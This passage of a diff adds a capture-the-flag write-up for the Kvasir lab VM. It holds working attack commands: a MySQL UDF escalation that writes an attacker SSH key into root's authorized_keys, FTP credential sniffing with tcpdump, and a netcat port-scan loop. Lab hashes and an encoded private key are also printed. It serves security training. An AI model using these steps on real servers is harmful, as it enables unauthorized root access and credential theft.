+RETURN ret;
+END IF;
+
+SET first_char = SUBSTRING(input,1,1);
+SET input = SUBSTRING(input,2);
+
+BEGIN
+DECLARE tempval TINYINT UNSIGNED;
+DECLARE error TINYINT DEFAULT 0;
+DECLARE base64_getval CURSOR FOR SELECT val FROM base64_data WHERE c = first_char;
+DECLARE CONTINUE HANDLER FOR SQLSTATE '02000' SET error = 1;
+
+OPEN base64_getval;
+FETCH base64_getval INTO tempval;
+CLOSE base64_getval;
+
+IF error THEN
+ITERATE each_input_char;
+END IF;
+
+SET accum_value = (accum_value &lt;&lt; 6) + tempval;
+END;
+
+SET in_count = in_count + 1;
+
+IF first_char = '=' THEN
+SET done = 1;
+SET out_count = out_count - 1;
+END IF;
+END; END WHILE;
+
+-- We've now accumulated 24 bits; deaccumulate into bytes
+
+-- We have to work from the left, so use the third byte position and shift left
+WHILE out_count &gt; 0 DO BEGIN
+SET ret = CONCAT(ret,CHAR((accum_value &amp; 0xff0000) &gt;&gt; 16));
+SET out_count = out_count - 1;
+SET accum_value = (accum_value &lt;&lt; 8) &amp; 0xffffff;
+END; END WHILE;
+
+END; END WHILE;
+
+RETURN ret;
+END |
+
+DROP FUNCTION IF EXISTS BASE64_ENCODE |
+CREATE FUNCTION BASE64_ENCODE (input BLOB)
+RETURNS BLOB
+CONTAINS SQL
+DETERMINISTIC
+SQL SECURITY INVOKER
+BEGIN
+DECLARE ret BLOB DEFAULT '';
+DECLARE done TINYINT DEFAULT 0;
+
+IF input IS NULL THEN
+RETURN NULL;
+END IF;
+
+each_block:
+WHILE NOT done DO BEGIN
+DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
+DECLARE in_count TINYINT DEFAULT 0;
+DECLARE out_count TINYINT;
+
+each_input_char:
+WHILE in_count &lt; 3 DO BEGIN
+DECLARE first_char CHAR(1);
+
+IF LENGTH(input) = 0 THEN
+SET done = 1;
+SET accum_value = accum_value &lt;&lt; (8 * (3 - in_count));
+LEAVE each_input_char;
+END IF;
+
+SET first_char = SUBSTRING(input,1,1);
+SET input = SUBSTRING(input,2);
+
+SET accum_value = (accum_value &lt;&lt; 8) + ASCII(first_char);
+
+SET in_count = in_count + 1;
+END; END WHILE;
+
+-- We've now accumulated 24 bits; deaccumulate into base64 characters
+
+-- We have to work from the left, so use the third byte position and shift left
+CASE
+WHEN in_count = 3 THEN SET out_count = 4;
+WHEN in_count = 2 THEN SET out_count = 3;
+WHEN in_count = 1 THEN SET out_count = 2;
+ELSE RETURN ret;
+END CASE;
+
+WHILE out_count &gt; 0 DO BEGIN
+BEGIN
+DECLARE out_char CHAR(1);
+DECLARE base64_getval CURSOR FOR SELECT c FROM base64_data WHERE val = (accum_value &gt;&gt; 18);
+
+OPEN base64_getval;
+FETCH base64_getval INTO out_char;
+CLOSE base64_getval;
+
+SET ret = CONCAT(ret,out_char);
+SET out_count = out_count - 1;
+SET accum_value = accum_value &lt;&lt; 6 &amp; 0xffffff;
+END;
+END; END WHILE;
+
+CASE
+WHEN in_count = 2 THEN SET ret = CONCAT(ret,'=');
+WHEN in_count = 1 THEN SET ret = CONCAT(ret,'==');
+ELSE BEGIN END;
+END CASE;
+
+END; END WHILE;
+
+RETURN ret;
+END |
+</code></pre>
+
+<ul>
+<li><p>Download 64 bit version of the <a href="https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql/linux">UDF library</a> and run <code>base64</code> through it (32 bit version returns: &lsquo;wrong ELF class: ELFCLASS32&rsquo;).</p></li>
+<li><p>Insert base64 value into the table</p></li>
+</ul>
+
+
+<pre><code>mysql&gt; insert into pwn(test) values ("f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAwAgAADQAAACoJAAAA (...)");
+</code></pre>
+
+<ul>
+<li>generate binary</li>
+</ul>
+
+
+<pre><code>mysql&gt; select base64_decode(test) from pentest into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+</code></pre>
+
+<ul>
+<li>add the following functions</li>
+</ul>
+
+
+<pre><code>DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
+DROP FUNCTION IF EXISTS sys_get;
+DROP FUNCTION IF EXISTS sys_set;
+DROP FUNCTION IF EXISTS sys_exec;
+DROP FUNCTION IF EXISTS sys_eval;
+
+CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
+</code></pre>
+
+<p><em>We really only need sys_eval</em></p>
+
+<ul>
+<li>generate keys on Kali and add public key to <code>/root/.ssh/authorized_keys</code> on the database server:</li>
+</ul>
+
+
+<pre><code>mysql&gt; select sys_eval('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqtaI+mJb7hYALi8qoSXi8wntkC4QuNyFNWLfDzNC1GxeU+pZHz9BCTqFKwzqYLC3Z4CcD3y8I7KsCrBEgFVJaW9OWCoZHeiSnoDOorv/9C8uk7CRZ1jM9AVE7fsuL6rOUHuEFbSgCDLnbo5SFntQSX7UqHDOnn6glhVf+zn58tYf8wMSdH+Is/oAVrJ0G7h7fKNvbIDkVysiBZeZQrMZ3KG5CVq/FzgnSg+WD14YsRVtlcI1irfAdR3MCl4SgGXohAOEvX6mrcMcbe8lvxGRzcJ/T6fe/dHmZUdhZll3ABSHRLYERFqXOtH7veGeZD/PyLXEDzvW0iJUPape2EYrB root@kali" &gt; /root/.ssh/authorized_keys');
+</code></pre>
+
+<ul>
+<li>set right permissions</li>
+</ul>
+
+
+<pre><code>mysql&gt; select sys_eval('chmod 600 /root/.ssh/authorized_keys');
+</code></pre>
+
+<p>And now we should be able to SSH in as root.</p>
+
+<pre><code>root@kali:~# proxychains ssh root@192.168.2.200
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:22-&lt;&gt;&lt;&gt;-OK
+Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  4 20:26:44 2014 from 192.168.2.100
+root@db:~#
+</code></pre>
+
+<p>Woooooo! That&rsquo;s not the final root though&hellip;</p>
+
+<pre><code>root@db:~# cat flag 
+This is not the flag you're looking for... :p
+</code></pre>
+
+<h2>FTP? Sniff! Sniff!</h2>
+
+<p>After a bit of poking around, we can get some potentially useful information - some dictionary&hellip;</p>
+
+<pre><code>root@db:~# head .words.txt 
+borne
+precombatting
+noncandescent
+cushat
+lushness
+
+(...truncated...)
+</code></pre>
+
+<p>Hostnames and IP addresses&hellip;</p>
+
+<pre><code>root@db:~# cat /etc/hosts
+# 192.168.3.40  celes
+# 192.168.3.50  terra
+
+127.0.0.1   localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0     ip6-localnet
+ff00::0     ip6-mcastprefix
+ff02::1     ip6-allnodes
+ff02::2     ip6-allrouters
+</code></pre>
+
+<p>Find out that it&rsquo;s dual homed&hellip; again!</p>
+
+<pre><code>root@db:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr fe:57:f7:0e:e1:98  
+          inet addr:192.168.2.200  Bcast:192.168.2.255  Mask:255.255.255.0
+          inet6 addr: fe80::fc57:f7ff:fe0e:e198/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:69773 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:55386 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:5835676 (5.5 MiB)  TX bytes:9220761 (8.7 MiB)
+
+eth1      Link encap:Ethernet  HWaddr 86:b5:59:44:80:fb  
+          inet addr:192.168.3.200  Bcast:192.168.3.255  Mask:255.255.255.0
+          inet6 addr: fe80::84b5:59ff:fe44:80fb/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:106899 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:91488 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:15188636 (14.4 MiB)  TX bytes:8176191 (7.7 MiB)
+
+(...)
+</code></pre>
+
+<p>And we can also see that there&rsquo;s FTP service enabled.</p>
+
+<pre><code>root@db:~# netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 192.168.2.200:3306      0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 192.168.2.200:22        192.168.2.100:43133     ESTABLISHED
+tcp        0      0 192.168.3.200:21214     192.168.3.40:45888      TIME_WAIT  
+tcp        0      0 192.168.3.200:58695     192.168.3.50:22         ESTABLISHED
+tcp        0    320 192.168.2.200:22        192.168.2.100:43595     ESTABLISHED
+tcp6       0      0 :::21                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+
+(...some more poking around...)
+
+root@db:~# cat /etc/pure-ftpd/pureftpd.passwd 
+celes:$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV/:1000:1000::/var/log/./::::::::::::
+</code></pre>
+
+<p>Unfortunately I didn&rsquo;t seem to be able to crack this password using a dictionary. That got me stuck a bit.
+Sometimes you need to take a step back and ask yourself a question &ldquo;what&rsquo;s insecure about&hellip; FTP?&rdquo;. Of course! It&rsquo;s plaintext!</p>
+
+<p>Let&rsquo;s assume (and hope) there are &lsquo;users&rsquo; on the system, so let&rsquo;s try to sniff some traffic!</p>
+
+<pre><code>root@db:~# tcpdump -i eth1 -vv -x 'port 21' -w ftp-sniff.pcap
+tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+^C21 packets captured
+21 packets received by filter
+0 packets dropped by kernel
+</code></pre>
+
+<p>Woohoo, there are some packets! Further investigation into them reveals the following username:password combination <code>celes:im22BF4HXn01</code>.</p>
+
+<h2>Stego</h2>
+
+<p>Let&rsquo;s hope celes is a user of very average security awarness and reuses his passwords everywhere&hellip; let&rsquo;s try to SSH using these credentials.</p>
+
+<pre><code>root@db:~# ssh celes@192.168.3.40
+celes@192.168.3.40's password: 
+Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Fri Oct 24 10:35:02 2014 from 192.168.3.200
+celes@dev1:~$ 
+</code></pre>
+
+<p>And we&rsquo;re in. A bit of poking around and can&rsquo;t see anything really interesting except an image file <code>kvasir.png</code>. Let&rsquo;s download it (<code>scp</code> all the way back) and see what can we get out of it.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/kvasir.png" title="Kvasir" alt="Kvasir" /></p>
+
+<p>Also <code>strings</code> didn&rsquo;t reveal anything interesting about the file. But looking at <code>.bash_history</code> on celes, we can see a clue.</p>
+
+<pre><code>celes@dev1:~$ cat .bash_history 
+stepic --help
+</code></pre>
+
+<p>Aha, must be some kind of stego! I have quickly downloaded <code>stepic</code> and run on <code>kvasir.png</code>.</p>
+
+<pre><code>root@kali:~/data/scripts/stepic-0.3# ./stepic -d -i ~/data/boot2root/kvasir/kvasir.png 
+89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082
+</code></pre>
+
+<p>Hmm, alright&hellip; that looks like some hex output&hellip; let&rsquo;s run it through <code>xxd</code></p>
+
+<pre><code>root@kali:~/data/scripts/stepic-0.3# echo "89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082" | xxd -p -r &gt; out
+root@kali:~/data/scripts/stepic-0.3# file out 
+out: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
+</code></pre>
+
+<p>Another image file! It&rsquo;s actually a QR code.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/qr.png" title="QR" alt="QR" /></p>
+
+<p>I passed it on to <a href="http://www.onlinebarcodereader.com/">Online Barcode Reader</a> and got the following text <code>Nk9yY31hva8q</code>. Not sure what it&rsquo;s for, may be some kind of password, let&rsquo;s hold on to it for now.</p>
+
+<h2>Solving anagrams</h2>
+
+<p>Having poked around a bit more on <code>celes</code>, I couldn&rsquo;t find anything interesting and it wasn&rsquo;t dual homed. One thing we haven&rsquo;t looked at yet is the other server - <code>terra</code> (192.168.3.50).</p>
+
+<p>Since we&rsquo;re looking at 192.168.3.0 subnet, that means that we would need to double-pivot from our Kali to do a port scan. While I tried that with metasploit, it was failing pretty badly (meterpreters kept crashing). We could put nmap on db server, but meh, I&rsquo;ve crafted my own, very simple portscanner.</p>
+
+<pre><code>root@db:~# for i in {1..65535}; do nc -z 192.168.3.50 $i; if [ $? -eq 0 ]; then echo "Port $i listening" &gt;&gt; results; fi; done
+root@db:~# cat results 
+Port 4444 listening
+</code></pre>
+
+<p>Awesome, let&rsquo;s see what it is.</p>
+
+<pre><code>root@db:~# nc 192.168.3.50 4444
+Hello Celes &amp; Welcome to the Jumble!
+
+Solve:ogsdioclpe 
+Solve:oagichrlogp 
+Solve:snelrgiermo ^C
+</code></pre>
+
+<p>Solving jumbles&hellip; great. I tried couple typical buffer overflow things etc., but none of them worked. I guess we&rsquo;ll need to script up anagram solver.</p>
+
+<p>Also, which dictionary should we use&hellip; after a bit of playing around with that jumble it seemed like there were couple known usernames from #vulnhub. And remember that words.txt file we looted earlier on? It was exactly it! Let&rsquo;s us that and code it all up.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">dictionary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">words</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Open</span> <span class="n">socket</span> <span class="ow">and</span> <span class="n">retrieve</span> <span class="n">welcome</span> <span class="n">message</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">3.50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">4444</span><span class="p">))</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">38</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Keep</span> <span class="n">getting</span> <span class="n">data</span> <span class="n">until</span> <span class="n">socket</span> <span class="n">closes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="c"># Read data from the server</span>
+</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5120</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># Get the word to decode and strip out spaces and new line</span>
+</span><span class='line'><span class="n">phrase</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Phrase = &quot;</span> <span class="o">+</span> <span class="n">phrase</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Rewind the file back to start</span>
+</span><span class='line'><span class="n">wordlist</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Go through each line in the wordlist and try to find a match</span>
+</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">found_match</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="s">&quot;n/a&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># Remove whitespaces and new lines from dictionary word</span>
+</span><span class='line'>    <span class="n">word</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># Start investigating phrase only if it has the same length as selected word from dictionary</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">phrase</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
+</span><span class='line'>        <span class="c"># Go through every letter in the phrase and check number of its occurrences against dictionary word,</span>
+</span><span class='line'>        <span class="c"># if it matches number of occurences of the letter in the phrase, move on to the next letter.</span>
+</span><span class='line'>        <span class="c"># As soon as it fails, don&#39;t bother investigating the word further</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">phrase</span><span class="p">)):</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">phrase</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">phrase</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="n">word</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">phrase</span><span class="p">[</span><span class="n">i</span><span class="p">]):</span>
+</span><span class='line'>                <span class="n">found_match</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">found_match</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">answer</span> <span class="o">=</span> <span class="n">word</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Answer = &quot;</span> <span class="o">+</span> <span class="n">answer</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Send answer to the server</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>It&rsquo;s actually really quick to run and we get another element in the puzzle.</p>
+
+<pre><code>root@db:~# ./anagram-socket.py 
+Phrase = itaingdhs
+Answer = gandhiist
+Phrase = aifieinvuacqotolr
+Answer = overqualification
+Phrase = gorypcueshsry
+Answer = psychosurgery
+
+(...truncated...)
+
+Phrase = iidvaeart
+Answer = radiative
+Phrase = bloiblhimpisi
+Answer = bibliophilism
+Phrase = hvnaci
+Answer = chavin
+Phrase = rabbsrae
+Answer = barrebas
+Phrase = : 120
+Time: 0.02 secs
+You're a winner
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY25oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQWUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSkJNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM1B2WnBYazlra2pYaG1PUXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2lrTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaUM5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvVnJyNWN4M2ZYak9lem1nc1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHorMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY2prSW5CZGU5NDVWK2VqaFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcUkzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM2Z3Skl3U1JnSzg1WGMyTXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVhqa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveEpsaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd3kycmxrdFE1L2E4ejJWQ3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKWTdCZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXanhVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0dDA0bENZQ0NLV1F6UGhnSXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3JYQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYYVVlMFhiN0ZqQS9ldm1wWHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4SU85b2JpZHh6STJyTGZieGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
+</code></pre>
+
+<p>When we <code>base64 -d</code> the output, we get the following RSA key.</p>
+
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
